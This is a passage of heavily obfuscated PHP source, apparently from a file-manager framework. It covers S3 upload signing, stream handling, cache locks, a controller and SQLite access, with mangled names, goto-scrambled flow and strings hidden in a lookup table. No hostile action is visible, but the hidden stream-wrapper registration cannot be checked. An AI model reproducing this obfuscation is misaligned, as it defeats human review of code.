$this->objectMeta($dœÎ¨ÀùÁ¶); return $Cæ£“»Êã¦ ? $Cæ£“»Êã¦[$_SERVER[¼€¼ˆ¦‚¡][77]] : 0; } public function info($CøÁÄÏœ›Ÿ) { if ($this->isFolder($CøÁÄÏœ›Ÿ)) { return $this->folderInfo($CøÁÄÏœ›Ÿ); } else { if ($this->isFile($CøÁÄÏœ›Ÿ)) { return $this->fileInfo($CøÁÄÏœ›Ÿ); } } return !1; } public function exist($fìÈñ–ïÍ) { return $this->isFile($fìÈñ–ïÍ) || $this->isFolder($fìÈñ–ïÍ); } public function isFile($EõÄÙÉó°Ù) { return !$this->isFolder($EõÄÙÉó°Ù) && $this->objectMeta($EõÄÙÉó°Ù); } public function isFolder($D½÷´†í¬Û) { return $this->cacheMethod($_SERVER[¼€¼ˆ¦‚¡][223], $D½÷´†í¬Û); } protected function objectMeta($eªÎ–çí¬ø) { return $this->cacheMethod($_SERVER[¼€¼ˆ¦‚¡][224], $eªÎ–çí¬ø); } protected function _objectMeta($báˆÆ¬÷å) { $CºÅ‘º²ï¶ =& $_SERVER[¼€¼ˆ¦‚¡]; list($c³‚ Ÿ, $CÚ­ˆÜ„Ú) = $this->bucketManager->stat($this->bucket, $báˆÆ¬÷å); if ($c³‚ Ÿ) { $c³‚ Ÿ[$CºÅ‘º²ï¶[77]] = intval($c³‚ Ÿ[$CºÅ‘º²ï¶[1216]]); } return $c³‚ Ÿ; } protected function _isFolder($aŠ¶¬Ì£ø¤) { $aÀØíÖÈØæ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($aŠ¶¬Ì£ø¤ == $aÀØíÖÈØæ[33] || $aŠ¶¬Ì£ø¤ == $aÀØíÖÈØæ[8]) { return !0; } list($Eİ·ÒµÙÒÆ, $a‡ËÁÈ±¨¢) = $this->bucketManager->listFiles($this->bucket, trim($aŠ¶¬Ì£ø¤, $aÀØíÖÈØæ[8]) . $aÀØíÖÈØæ[8], $aÀØíÖÈØæ[33], 1, $aÀØíÖÈØæ[8]); return !empty($Eİ·ÒµÙÒÆ[$aÀØíÖÈØæ[1215]]) || !empty($Eİ·ÒµÙÒÆ[$aÀØíÖÈØæ[1218]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($BìºÃ°’Š) { parent::__construct($BìºÃ°’Š); } public function uploadFormData($F¡•Ú£›, $bä¨ÍÇ‚ô« = 3600) { goto Bò¥ñÕä‘£; F‚å¢Éøåù: $c§¢á§ƒ‹Ó = $Fî¸Ü…Š±²[59]; $a†³åï½¯ = gmdate($Fî¸Ü…Š±²[1135]); $fŠŠˆ¼ï´Ã = gmdate($Fî¸Ü…Š±²[686]); goto AÒ‘ÖòÀ³¼; b‰èïÚÈÆ: $F™ñÊë¡ = array($Fî¸Ü…Š±²[199] => $Fî¸Ü…Š±²[33], $Fî¸Ü…Š±²[1146] => $Fî¸Ü…Š±²[33], $Fî¸Ü…Š±²[1104] => $d–†…×Æ‰Ú, $Fî¸Ü…Š±²[1108] => $AÇºÃˆ‹°ô, $Fî¸Ü…Š±²[1112] => $BÂö£Öïİ¦, $Fî¸Ü…Š±²[1147] => $cì±š…´“î, $Fî¸Ü…Š±²[1148] => $B»´†ÑÙ¥Î, $Fî¸Ü…Š±²[1149] => $a†³åï½¯, $Fî¸Ü…Š±²[1150] => $eÃ¼ò¾—ÔÁ, $Fî¸Ü…Š±²[1151] => $fÁ’¡¼†š, $Fî¸Ü…Š±²[169] => $this->getHost()); return $F™ñÊë¡; goto aí¸¬Á¨; Bò¥ñÕä‘£: $Fî¸Ü…Š±² =& $_SERVER[¼€¼ˆ¦‚¡]; $d–†…×Æ‰Ú = $Fî¸Ü…Š±²[185]; $B»´†ÑÙ¥Î = $Fî¸Ü…Š±²[1134]; goto F‚å¢Éøåù; CÎäÕÚ¾Áä: $Eåò°Öø‘² = hash_hmac($Fî¸Ü…Š±²[1144], $c§¢á§ƒ‹Ó, $aİš®…î’…, !0); $f‰…²ÏºÏñ = hash_hmac($Fî¸Ü…Š±²[1144], $d¦ø¡½², $Eåò°Öø‘², !0); $fÁ’¡¼†š = hash_hmac($Fî¸Ü…Š±²[1144], $BÂö£Öïİ¦, $f‰…²ÏºÏñ); goto b‰èïÚÈÆ; AÒ‘ÖòÀ³¼: $d¦ø¡½² = $Fî¸Ü…Š±²[1136]; $eÃ¼ò¾—ÔÁ = $bä¨ÍÇ‚ô« . $Fî¸Ü…Š±²[33]; $AÇºÃˆ‹°ô = $Fî¸Ü…Š±²[1100]; goto Fµ’ñÅ³ÕÍ; a†Šñ—‡ˆ: $BÂö£Öïİ¦ = base64_encode(json_encode($e‚²ï”­ó)); $aÜ±’ÏâŒâ = hash_hmac($Fî¸Ü…Š±²[1144], $fŠŠˆ¼ï´Ã, $Fî¸Ü…Š±²[1145] . $this->secret, !0); $aİš®…î’… = hash_hmac($Fî¸Ü…Š±²[1144], $this->region, $aÜ±’ÏâŒâ, !0); goto CÎäÕÚ¾Áä; Fµ’ñÅ³ÕÍ: $eÑ›åç×Üİ = array($this->accessKey, $fŠŠˆ¼ï´Ã, $this->region, $c§¢á§ƒ‹Ó, $d¦ø¡½²); $cì±š…´“î = implode($Fî¸Ü…Š±²[8], $eÑ›åç×Üİ); $e‚²ï”­ó = array($Fî¸Ü…Š±²[1102] => gmdate($Fî¸Ü…Š±²[1101], strtotime($Fî¸Ü…Š±²[1137])), $Fî¸Ü…Š±²[1103] => array(array($Fî¸Ü…Š±²[1105] => $this->bucket), array($Fî¸Ü…Š±²[1104] => $d–†…×Æ‰Ú), array($Fî¸Ü…Š±²[1106], $Fî¸Ü…Š±²[1107], $Fî¸Ü…Š±²[33]), array($Fî¸Ü…Š±²[1106], $Fî¸Ü…Š±²[1138], $Fî¸Ü…Š±²[33]), array($Fî¸Ü…Š±²[1106], $Fî¸Ü…Š±²[1139], $Fî¸Ü…Š±²[33]), array($Fî¸Ü…Š±²[1108] => $AÇºÃˆ‹°ô), array($Fî¸Ü…Š±²[1140] => $cì±š…´“î), array($Fî¸Ü…Š±²[1141] => $B»´†ÑÙ¥Î), array($Fî¸Ü…Š±²[1142] => $a†³åï½¯), array($Fî¸Ü…Š±²[1143] => $eÃ¼ò¾—ÔÁ))); goto a†Šñ—‡ˆ; aí¸¬Á¨: } public function multiUploadFormData($Eæà³ÄÕÒˆ, $a‡‚”ğÎë = 3600) { $Fï…¹¥ïŒá =& $_SERVER[¼€¼ˆ¦‚¡]; $EŞŠ£ƒ = gmdate($Fï…¹¥ïŒá[1230]); $BÏ†ƒŒŒøÉ = array(); $fèöÜ¿ïßæ = $this->client->getUploadId($this->bucket, $Eæà³ÄÕÒˆ, $BÏ†ƒŒŒøÉ); if (!$fèöÜ¿ïßæ) { return !1; } return array($Fï…¹¥ïŒá[209] => $fèöÜ¿ïßæ, $Fï…¹¥ïŒá[169] => $this->getHost() . $Fï…¹¥ïŒá[8] . $this->pathEncode($Eæà³ÄÕÒˆ), $Fï…¹¥ïŒá[210] => $EŞŠ£ƒ, $Fï…¹¥ïŒá[89] => $Eæà³ÄÕÒˆ); } public function multiUploadAuthData($Dùî¯æŞóÍ, $dÙİÀëÓ‡Ş = array()) { goto c‡Íñ‘§ç; eÑ‹ƒñîÏâ: $fâÁçà¡¯ = $DØ…¼²±ÒØ[214]; $d†ïÎš¿×Å = $DØ…¼²±ÒØ[8] . $this->pathEncode($C•ƒğœíí) . $Bß¨¾Œ†ôè; $BŞµšËÆï£ = $this->client->__getSignatureV4($DÖÉ•Î¡´õ, $Fİí¡Ñ°ãƒ, $fâÁçà¡¯, $d†ïÎš¿×Å); goto Açìæ«Œç¸; E·…áà«Ù: unset($dÙİÀëÓ‡Ş[$DØ…¼²±ÒØ[89]]); if (isset($dÙİÀëÓ‡Ş[$DØ…¼²±ÒØ[211]])) { return $this->listUploadParts($C•ƒğœíí, $dÙİÀëÓ‡Ş); } $DÖÉ•Î¡´õ = array(); goto A‘Ô‹Õœ¤; Açìæ«Œç¸: if (strpos($Bß¨¾Œ†ôè, $DØ…¼²±ÒØ[213]) === 0) { if (isset($DÖÉ•Î¡´õ[$DØ…¼²±ÒØ[1232]])) { $bÂ­õÆÒîº = $DÖÉ•Î¡´õ[$DØ…¼²±ÒØ[1232]]; } else { if (isset($BŞµšËÆï£[$DØ…¼²±ÒØ[1232]])) { $bÂ­õÆÒîº = $BŞµšËÆï£[$DØ…¼²±ÒØ[1232]]; } else { $bÂ­õÆÒîº = hash($DØ…¼²±ÒØ[1144], $DØ…¼²±ÒØ[33]); } } return array($DØ…¼²±ÒØ[220] => $BŞµšËÆï£[$DØ…¼²±ÒØ[220]], $DØ…¼²±ÒØ[1232] => $bÂ­õÆÒîº, $DØ…¼²±ÒØ[210] => $BŞµšËÆï£[$DØ…¼²±ÒØ[1235]]); } return $BŞµšËÆï£[$DØ…¼²±ÒØ[220]]; goto DªÛ»¢Œ«á; c‡Íñ‘§ç: $DØ…¼²±ÒØ =& $_SERVER[¼€¼ˆ¦‚¡]; $Bß¨¾Œ†ôè = isset($dÙİÀëÓ‡Ş[$DØ…¼²±ÒØ[160]]) ? $dÙİÀëÓ‡Ş[$DØ…¼²±ÒØ[160]] : $DØ…¼²±ÒØ[33]; $C•ƒğœíí = $dÙİÀëÓ‡Ş[$DØ…¼²±ÒØ[89]]; goto E·…áà«Ù; A‘Ô‹Õœ¤: if (isset($dÙİÀëÓ‡Ş[$DØ…¼²±ÒØ[1231]])) { $DÖÉ•Î¡´õ[$DØ…¼²±ÒØ[1232]] = $dÙİÀëÓ‡Ş[$DØ…¼²±ÒØ[1231]]; } $fÆÂ«¨·ìÕ = explode($DØ…¼²±ÒØ[171], $this->getHost()); $Fİí¡Ñ°ãƒ = array($DØ…¼²±ÒØ[1233] => $fÆÂ«¨·ìÕ[1], $DØ…¼²±ÒØ[1234] => $DØ…¼²±ÒØ[33], $DØ…¼²±ÒØ[199] => $DØ…¼²±ÒØ[116], $DØ…¼²±ÒØ[1146] => $dÙİÀëÓ‡Ş[$DØ…¼²±ÒØ[77]]); goto eÑ‹ƒñîÏâ; DªÛ»¢Œ«á: } public function listUploadParts($F˜Ÿğô…Ê½, $f×º–‚‰ĞÉ = array()) { goto e–¨šƒ´èÉ; E™ÕºßÉ: if (!$C£İøßİÏ‡) { return !1; } $c™„‡”¦‰ = $EĞã©ÓìÅì[1236]; foreach ($C£İøßİÏ‡ as $fÌ¸éÀè˜Ü) { $c™„‡”¦‰ .= $EĞã©ÓìÅì[1237] . "\x3c\x50\141\x72\x74\116\165\155\x62\x65\162\x3e{$fÌ¸éÀè˜Ü[$EĞã©ÓìÅì[1188]]}\74\x2f\120\x61\162\164\116\165\155\142\145\x72\76\xa" . "\x3c\x45\x54\x61\x67\x3e{$fÌ¸éÀè˜Ü[$EĞã©ÓìÅì[1189]]}\74\x2f\x45\124\141\147\x3e\12" . $EĞã©ÓìÅì[1238]; } goto F²¼‰Ğ‰ß™; e–¨šƒ´èÉ: $EĞã©ÓìÅì =& $_SERVER[¼€¼ˆ¦‚¡]; $DïÔ³àâÆõ = str_replace($EĞã©ÓìÅì[221], $EĞã©ÓìÅì[33], $f×º–‚‰ĞÉ[$EĞã©ÓìÅì[160]]); $C£İøßİÏ‡ = $this->client->listParts($this->bucket, $F˜Ÿğô…Ê½, $DïÔ³àâÆõ); goto E™ÕºßÉ; CÓ¡ì§˜: $Bê¸˜ØÍµ” = $this->client->__getSignatureV4($FÖƒè‹Şçè, $cŞ×—…ÇÔ, $bóˆ¦ ÃÛ, $a¯«­ Í¨¢, $c™„‡”¦‰); return array($EĞã©ÓìÅì[220] => $Bê¸˜ØÍµ”[$EĞã©ÓìÅì[220]], $EĞã©ÓìÅì[210] => $Bê¸˜ØÍµ”[$EĞã©ÓìÅì[1235]], $EĞã©ÓìÅì[222] => $C£İøßİÏ‡, $EĞã©ÓìÅì[1232] => $Bê¸˜ØÍµ”[$EĞã©ÓìÅì[1232]]); goto aõ¿Ã·ŸÉ¥; DÏÎ†”ŸôÅ: $cŞ×—…ÇÔ = array($EĞã©ÓìÅì[1233] => $C¸ô„ŠÎ…‰[1], $EĞã©ÓìÅì[199] => $EĞã©ÓìÅì[116], $EĞã©ÓìÅì[1146] => strlen($c™„‡”¦‰)); $bóˆ¦ ÃÛ = $EĞã©ÓìÅì[212]; $a¯«­ Í¨¢ = $EĞã©ÓìÅì[8] . $this->pathEncode($F˜Ÿğô…Ê½) . $f×º–‚‰ĞÉ[$EĞã©ÓìÅì[160]]; goto CÓ¡ì§˜; F²¼‰Ğ‰ß™: $c™„‡”¦‰ .= $EĞã©ÓìÅì[1239]; $FÖƒè‹Şçè = array(); $C¸ô„ŠÎ…‰ = explode($EĞã©ÓìÅì[171], $this->getHost()); goto DÏÎ†”ŸôÅ; aõ¿Ã·ŸÉ¥: } public function link($fÈŒ¶…ÀÎß, $fºèéÒ¡ÁÃ = array()) { return parent::link($fÈŒ¶…ÀÎß, $fºèéÒ¡ÁÃ); } public function fileOut($bƒîíµÊ“¼, $a½¹£…ï¸ = false, $aô‚±´Ú = false, $F‰¯·à‰Ù« = '') { if (strstr($this->endpoint, $_SERVER[¼€¼ˆ¦‚¡][1240])) { return parent::fileOutServer($bƒîíµÊ“¼, $a½¹£…ï¸, $aô‚±´Ú, $F‰¯·à‰Ù«); } parent::fileOut($bƒîíµÊ“¼, $a½¹£…ï¸, $aô‚±´Ú, $F‰¯·à‰Ù«); } public function fileOutImage($CªèÙâÓ‚², $d—‚‘ßÛë = 250) { if (strstr($this->endpoint, $_SERVER[¼€¼ˆ¦‚¡][1240])) { return parent::fileOutImageServer($CªèÙâÓ‚², $d—‚‘ßÛë); } parent::fileOutImage($CªèÙâÓ‚², $d—‚‘ßÛë); } public function fileOutLink($F¦ÁíˆŒ…) { $F÷Ã‹­š =& $_SERVER[¼€¼ˆ¦‚¡]; if (substr($F¦ÁíˆŒ…, 0, 7) == $F÷Ã‹­š[1115]) { $F¦ÁíˆŒ… = $F÷Ã‹­š[1116] . substr($F¦ÁíˆŒ…, 7); } header($F÷Ã‹­š[156] . $F¦ÁíˆŒ…); die; } public function getHost() { $cˆ±¨£Á¿ë =& $_SERVER[¼€¼ˆ¦‚¡]; $Bñ˜ƒôİÒ = str_rtrim(parent::getHost(), $cˆ±¨£Á¿ë[8] . $this->bucket); $Bñ˜ƒôİÒ = explode($cˆ±¨£Á¿ë[171], $Bñ˜ƒôİÒ); return $Bñ˜ƒôİÒ[0] . $cˆ±¨£Á¿ë[171] . $this->bucket . $cˆ±¨£Á¿ë[91] . $Bñ˜ƒôİÒ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($fè¸¼ÛÔÏ¬, $B¡¸ÚÁŠÓ = 0) { parent::__construct(); $this->source = $fè¸¼ÛÔÏ¬; $this->sourceSize = $B¡¸ÚÁŠÓ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($C¸„­‡âÁ¢ = false) { return $this->sourceSize; } public function getContent($D‰Œæª¢ÍÁ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Fó£µ–˜…À = ftell($this->source); $F­ƒ®ÈÇø´ = @fread($this->source, $this->sourceSize); fseek($this->source, $Fó£µ–˜…À); return $F­ƒ®ÈÇø´; } } public function fileSubstr($Fä´×Ÿšç× = false, $Døê«Œ­°‡ = 0, $f’ÈÇ™‘« = 0) { if (!$f’ÈÇ™‘«) { $f’ÈÇ™‘« = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Døê«Œ­°‡, $f’ÈÇ™‘«); } if ($this->sourceType == self::TYPE_FILE) { $bÔîÊéŒ‹Ô = ftell($this->source); fseek($this->source, $bÔîÊéŒ‹Ô + $Døê«Œ­°‡); $Eë†„ Ïì = @fread($this->source, $f’ÈÇ™‘«); fseek($this->source, $bÔîÊéŒ‹Ô); return $Eë†„ Ïì; } } public function hashMd5($d –ÏÇÔ©× = false) { return md5($this->getContent()); } public static function hash($cí·øÍ‰‘ø, $b–Åİ éòÇ = 0) { $dºçŒŠøã = new PathDriverStream($cí·øÍ‰‘ø, $b–Åİ éòÇ); return $dºçŒŠøã->hashSimple($cí·øÍ‰‘ø); } public static function md5($eœÍĞ™£ñŞ, $càÆ‚¹«” = 0) { $bŒ«»Øï‹¿ = new PathDriverStream($eœÍĞ™£ñŞ, $càÆ‚¹«”); return $bŒ«»Øï‹¿->hashMd5($eœÍĞ™£ñŞ); } } goto CÁÓ­£ñ•¼; BåÏ¶ÁĞÅ: $_SERVER[$_SERVER[¿‰šÇ ][52]] = (strrev('5079')."\71\67")+0;$_39Zz="2atjZXMWm8B8uTysxUc4Ge3CWSe6dugnHiUZ7MCzgTfiPuE2UFRGiq5NadCfrv3MQ8JWrY8NdsdKKhw9QR";; stream_wrapper_register($_SERVER[¿‰šÇ ][53], $_SERVER[¿‰šÇ ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($D”»é˜£ô…, $A–Šù’áÄí) { $D†Ğİºâ£Ÿ =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset(self::$_methodList[$D”»é˜£ô…])) { return @call_user_func_array(self::$_methodList[$D”»é˜£ô…], $A–Šù’áÄí); } else { if (method_exists($this, $D”»é˜£ô…)) { return call_user_func_array(array($this, $D”»é˜£ô…), $A–Šù’áÄí); } else { think_exception(__CLASS__ . $D†Ğİºâ£Ÿ[4] . $D”»é˜£ô… . $D†Ğİºâ£Ÿ[5]); } } } public static function __callStatic($aªáâÏ¦›¶, $aÃ‚çÜ‡) { if (isset(self::$_methodListStatic[$aªáâÏ¦›¶])) { return call_user_func_array(self::$_methodListStatic[$aªáâÏ¦›¶], $aÃ‚çÜ‡); } else { if (method_exists(self, $aªáâÏ¦›¶)) { return call_user_func_array(array(self, $aªáâÏ¦›¶), $aÃ‚çÜ‡); } else { show_json("{$aªáâÏ¦›¶}\x28\51\x20\x6e\x6f\x74\x20\145\170\x69\163\x74\x3b", !1); } } } public static function addMethod($f®õÎ†‡ÄĞ, $e´‡‘†‚ ë) { self::$_methodList[$f®õÎ†‡ÄĞ] = $e´‡‘†‚ ë; } public static function addMethodStatic($f×Á—æğæÇ, $cŒˆïÖÌ—) { self::$_methodListStatic[$f×Á—æğæÇ] = $cŒˆïÖÌ—; } } goto b‰Ü»ÔÖ„×; AÀ¨•ˆïÛ™: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $D„Éñ½ÅâÌ =& $_SERVER[¼€¼ˆ¦‚¡]; $E–ĞÕò’ = $GLOBALS[$D„Éñ½ÅâÌ[6]][$D„Éñ½ÅâÌ[337]]; self::$cachePath = $E–ĞÕò’[$D„Éñ½ÅâÌ[167]][$D„Éñ½ÅâÌ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($aŠÜ¯–ãÜµ, $D‚¥ï˜¦¬ = 0) { goto cÁ¼š¥”’; E”á¿š‚ç: $Dß²õºÇ˜ = rtrim(self::$cachePath, $c©à…Š³ß[8]) . $c©à…Š³ß[770] . md5($aŠÜ¯–ãÜµ) . $c©à…Š³ß[771]; if (file_exists($Dß²õºÇ˜) && filemtime($Dß²õºÇ˜) && filemtime($Dß²õºÇ˜) < time() - 10) { @unlink($Dß²õºÇ˜); } do { if (file_exists($Dß²õºÇ˜)) { cacheLockWait(); continue; } $a²µ¨¯ˆ¦ê = fopen($Dß²õºÇ˜, $c©à…Š³ß[772]); if (!$a²µ¨¯ˆ¦ê) { return !1; } $CßñÇçœÇÇ = flock($a²µ¨¯ˆ¦ê, LOCK_EX | LOCK_NB); self::$caches[$aŠÜ¯–ãÜµ] = array($c©à…Š³ß[773] => $a²µ¨¯ˆ¦ê, $c©à…Š³ß[167] => $Dß²õºÇ˜); fwrite($a²µ¨¯ˆ¦ê, $e¡³®Äœë¡); clearstatcache(); if ($a²µ¨¯ˆ¦ê && $CßñÇçœÇÇ) { return !0; } cacheLockWait(); } while (microtime(!0) < $e¡³®Äœë¡); goto EÏ×èÃ•‘ë; cÁ¼š¥”’: $c©à…Š³ß =& $_SERVER[¼€¼ˆ¦‚¡]; $b’˜³Ø¬¹µ = microtime(!0); $e¡³®Äœë¡ = $b’˜³Ø¬¹µ + $D‚¥ï˜¦¬ + 0.0001; goto E”á¿š‚ç; EÏ×èÃ•‘ë: $this->unlock($aŠÜ¯–ãÜµ); return !1; goto a‡£Ë÷™ï–; a‡£Ë÷™ï–: } public function lockGet($B…¯´õ½ì) { $D˜ÈÂò¼°é =& $_SERVER[¼€¼ˆ¦‚¡]; $cğÌÊ±˜ƒÏ = rtrim(self::$cachePath, $D˜ÈÂò¼°é[8]) . $D˜ÈÂò¼°é[770] . md5($B…¯´õ½ì) . $D˜ÈÂò¼°é[771]; return file_exists($cğÌÊ±˜ƒÏ); } public function unlock($eô¨ì¼Œ˜•) { goto fì†Ş”»âÛ; E Ú¾Ğ¥ãÍ: unset(self::$caches[$eô¨ì¼Œ˜•]); goto aÀÙÑØ„’í; fì†Ş”»âÛ: $AŠˆİ‡ÒĞ˜ =& $_SERVER[¼€¼ˆ¦‚¡]; $E‘á³ÜÂƒÎ = self::$caches[$eô¨ì¼Œ˜•]; if (!$E‘á³ÜÂƒÎ) { return; } goto B½‹ºá¾; B½‹ºá¾: @flock($E‘á³ÜÂƒÎ[$AŠˆİ‡ÒĞ˜[773]], LOCK_UN); @fclose($E‘á³ÜÂƒÎ[$AŠˆİ‡ÒĞ˜[773]]); @unlink($E‘á³ÜÂƒÎ[$AŠˆİ‡ÒĞ˜[167]]); goto E Ú¾Ğ¥ãÍ; aÀÙÑØ„’í: } } class CacheLockRedis { public function lock($bà÷éø‰î, $FËŸÍŠÑ‚Ñ = 10) { $FÂÖ·Éˆ¾ = Cache::init(); $Dí½™•ñØ‚ = microtime(!0) + $FËŸÍŠÑ‚Ñ; while (microtime(!0) < $Dí½™•ñØ‚) { $eçÏ»ç¦ª‚ = $FÂÖ·Éˆ¾->get($bà÷éø‰î); if (!$eçÏ»ç¦ª‚) { $cŸ¸œò˜¹ = $FÂÖ·Éˆ¾->setLock($bà÷éø‰î, $Dí½™•ñØ‚, $FËŸÍŠÑ‚Ñ); if ($cŸ¸œò˜¹) { return !0; } } else { if ($eçÏ»ç¦ª‚ < microtime(!0)) { $FÂÖ·Éˆ¾->set($bà÷éø‰î, $Dí½™•ñØ‚, $Dí½™•ñØ‚); if ($FÂÖ·Éˆ¾->get($bà÷éø‰î) === $eçÏ»ç¦ª‚) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($aÔøÂ‹Ø¦Ë) { return Cache::init()->get($aÔøÂ‹Ø¦Ë); } public function unlock($B•ÂšèÇÔô) { return Cache::init()->remove($B•ÂšèÇÔô); } } goto bŠ‹×Ãù¯˜; b‰Ü»ÔÖ„×: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto AÓáƒ· ¦¹; fğÊ»ßº¨­: $this->in =& $in; $this->values[$A°æ‘Ï·’É[6]] =& $config; $this->values[$A°æ‘Ï·’É[7]] =& $in; goto C”êÑçŸÛ; AÓáƒ· ¦¹: $A°æ‘Ï·’É =& $_SERVER[¼€¼ˆ¦‚¡]; global $in, $config; $this->config =& $config; goto fğÊ»ßº¨­; C”êÑçŸÛ: $this->tpl = TEMPLATE . MOD . $A°æ‘Ï·’É[8]; $this->_classObjectID = mt_rand(0, 10000); goto B‹àÂßŸƒ¾; B‹àÂßŸƒ¾: } public function loadClass($a¶ÕİÈí±¼) { if (1 === func_num_args()) { $this->{$a¶ÕİÈí±¼} = new $a¶ÕİÈí±¼(); } else { $d‰…ßø¿é = new ReflectionClass($a¶ÕİÈí±¼); $A£²Ç‰ŒÂö = func_get_args(); array_shift($A£²Ç‰ŒÂö); $this->{$a¶ÕİÈí±¼} = $d‰…ßø¿é->newInstanceArgs($A£²Ç‰ŒÂö); } return $this->{$a¶ÕİÈí±¼}; } protected function assign($e„„¬ğó‰¥, $BĞÇ‘ÎÂÕ) { $this->values[$e„„¬ğó‰¥] = $BĞÇ‘ÎÂÕ; } protected function display($C­™øƒ›Ä) { ob_end_clean(); extract($this->values); require $this->tpl . $C­™øƒ›Ä; } } class DbSqliteBase extends Db { public function __construct($aáè„¼¦Ã = '') { $däÕ„Ê¾Æ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!extension_loaded($däÕ„Ê¾Æ[9])) { think_exception(think_lang($däÕ„Ê¾Æ[10]) . $däÕ„Ê¾Æ[11]); } if (!empty($aáè„¼¦Ã)) { if (!isset($aáè„¼¦Ã[$däÕ„Ê¾Æ[12]])) { $aáè„¼¦Ã[$däÕ„Ê¾Æ[12]] = 438; } $this->config = $aáè„¼¦Ã; if (empty($this->config[$däÕ„Ê¾Æ[13]])) { $this->config[$däÕ„Ê¾Æ[13]] = array(); } } } public function connect($fš›¼äê°” = '', $Aº¸İÁñÅ = 0) { $fª½‚Ë‘…¾ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($this->linkID[$Aº¸İÁñÅ])) { goto cµÑÎ›‰Æö; fäçÀœÕÎö: $this->linkID[$Aº¸İÁñÅ] = $cŞáƒÌê‹($fš›¼äê°”[$fª½‚Ë‘…¾[17]], $fš›¼äê°”[$fª½‚Ë‘…¾[12]]); if (!$this->linkID[$Aº¸İÁñÅ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto b¨Ñ¥—‘ÍÑ; b¨Ñ¥—‘ÍÑ: @sqlite_busy_timeout($this->linkID[$Aº¸İÁñÅ], 30000); if (1 != think_config($fª½‚Ë‘…¾[18])) { unset($this->config); } goto C­ÁÓÉÛ†; cµÑÎ›‰Æö: if (empty($fš›¼äê°”)) { $fš›¼äê°” = $this->config; } $a‹‰îŸõÀ˜ = !empty($fš›¼äê°”[$fª½‚Ë‘…¾[13]][$fª½‚Ë‘…¾[14]]) ? $fš›¼äê°”[$fª½‚Ë‘…¾[13]][$fª½‚Ë‘…¾[14]] : $this->pconnect; $cŞáƒÌê‹ = $a‹‰îŸõÀ˜ ? $fª½‚Ë‘…¾[15] : $fª½‚Ë‘…¾[16]; goto fäçÀœÕÎö; C­ÁÓÉÛ†: } return $this->linkID[$Aº¸İÁñÅ]; } public function free() { $this->queryID = null; } public function query($fÂì¬àï—¨) { goto e›—ìØô¸; f‰†ÙÉá‡: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $D»‘ Æ¸Â¸ = $this->getAll(); return $D»‘ Æ¸Â¸; } goto E¹õ—’¨™‰; eœÓÛŞ“¡: $this->queryStr = $fÂì¬àï—¨; if ($this->queryID) { $this->free(); } think_action_status($AØ¶‰ìâ[19], 1); goto B¸öùÙÎ¬; B¸öùÙÎ¬: think_status($AØ¶‰ìâ[20]); $this->queryID = sqlite_query($this->_linkID, $fÂì¬àï—¨); $this->debug(); goto f‰†ÙÉá‡; e›—ìØô¸: $AØ¶‰ìâ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eœÓÛŞ“¡; E¹õ—’¨™‰: } public function execute($C¯²‰öœÓï) { goto b×æÏìš¦; A¡…äè¢×Š: $this->queryStr = $C¯²‰öœÓï; if ($this->queryID) { $this->free(); } think_action_status($AçÆÑ±æ”ˆ[21], 1); goto b‰ÉùØŠœâ; Eè‡¹æÙà: if (!1 === $c”êĞ˜¥Õâ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto CÚ”‚¬¹½º; b×æÏìš¦: $AçÆÑ±æ”ˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A¡…äè¢×Š; b‰ÉùØŠœâ: think_status($AçÆÑ±æ”ˆ[20]); $c”êĞ˜¥Õâ = sqlite_exec($this->_linkID, $C¯²‰öœÓï); $this->debug(); goto Eè‡¹æÙà; CÚ”‚¬¹½º: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¼€¼ˆ¦‚¡][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $båğºÄåù¦ = sqlite_query($this->_linkID, $_SERVER[¼€¼ˆ¦‚¡][23]); if (!$båğºÄåù¦) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fçÜ‚ƒËÊØ = sqlite_query($this->_linkID, $_SERVER[¼€¼ˆ¦‚¡][24]); if (!$fçÜ‚ƒËÊØ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $E×ùŠÂšå = array(); if ($this->numRows > 0) { for ($DˆÌĞÒœª¶ = 0; $DˆÌĞÒœª¶ < $this->numRows; $DˆÌĞÒœª¶++) { $E×ùŠÂšå[$DˆÌĞÒœª¶] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $E×ùŠÂšå; } public function getFields($CÈÎáĞ£Î) { $aïÄ»÷È¨» =& $_SERVER[¼€¼ˆ¦‚¡]; $DÈšª°°© = $this->query($aïÄ»÷È¨»[25] . $CÈÎáĞ£Î . $aïÄ»÷È¨»[26]); $bİñèòœ = array(); if ($DÈšª°°©) { foreach ($DÈšª°°© as $d•˜ßğ©øô => $D‚îƒŒÀ‚º) { 